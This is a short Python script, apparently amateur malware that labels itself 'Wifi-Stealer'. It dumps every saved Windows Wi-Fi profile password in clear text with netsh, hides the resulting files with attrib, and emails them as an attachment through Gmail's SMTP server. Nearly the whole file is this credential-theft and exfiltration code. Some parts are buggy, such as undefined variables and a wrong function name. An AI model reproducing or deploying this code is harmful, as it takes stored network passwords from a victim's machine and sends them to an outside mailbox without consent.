import os
import socket
import base64
import smtplib


from email.mime.text import MIMEText
from email import encoders
from email.mime.base import MIMEBase
from email.mime.multipart import MIMEMultipart


def getSSID(a):
    file = open('random{}.txt'.format(a),'r')
    linhas = file.readlines()
    file.close()
    ssid = []
    for linha in linhas:
        linha = linha.strip()
        if linha.find(': ') != -1:
            SSID = (linha.strip('All Users Profiles:'))
            ssid.append(SSID)
            pass
        pass
    return ssid
    pass

def mkText():
    a = 0
    while True:
        file = 'random{}.txt'.format(a)
        if os.path.isfile(file):
            a = a + 1
        else:
            os.system('netsh wlan show profiles > random{}.txt'.format(a))
            return a
    pass

def hide(a):
    nick = 'random{}.txt'.format(a)
    nick2 = 'passwd{}.txt'.format(a)
    folder = os.listdir(os.getcwd())
    for arq in folder:
        if nick == arq or nick2 == arq:
            os.system('attrib +h +i -a {}'.format(nick))
            os.system('attrib +h +i -a {}'.format(nick2))
            break
            pass
        pass
    pass

def execute():
    a = mkText()
    string = getSSID(a)
    for x in range(0, string.__len__()):
        os.system('netsh wlan show profiles "{}" key=clear >> passwd{}.txt'.format(string[x],a))
        pass
    hide(a)
    return a
    pass

def check_host():

   confiaveis = ['www.google.com', 'www.yahoo.com', 'www.bb.com.br']
   for host in confiaveis:
     a=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
     a.settimeout(.5)
     try:
       b=a.connect_ex((host, 80))
       if b==0: #ok, conectado
         return True
     except:
       pass
     a.close()
   return False



def getMail():

    #print("Google Mail ... ")
    #email = input("Email: ")
    #passwd = input("Password: ")
    

    emailSend(email,passwd)


    pass


def emailSend(email, passwd):



    fromaddr = email
    toaddr = email

    msg = MIMEMultipart()

    msg['From'] = fromaddr
    msg['To'] = toaddr
    msg['Subject'] = "Senhas ... "

    body = "Wifi-Stealer  -  m4sk0fm3"

    msg.attach(MIMEText(body, 'plain'))

    filename = "bonus.txt"
    attachment = open("passwd.txt", "rb")

    part = MIMEBase('application', 'octet-stream')
    part.set_payload((attachment).read())
    encoders.encode_base64(part)
    part.add_header('Content-Disposition', "attachment; filename= %s" % filename)

    msg.attach(part)

    server = smtplib.SMTP('smtp.gmail.com', 587)
    server.starttls()
    server.login(fromaddr, passwd)
    text = msg.as_string()
    server.sendmail(fromaddr, toaddr, text)
    server.quit()



    pass





if __name__ == '__main__':

    a = execute()

    getMail()

    if(check_host()):
        email('{}'.format(a))
        print('workando')
    else:
        print('não workando')
        pass




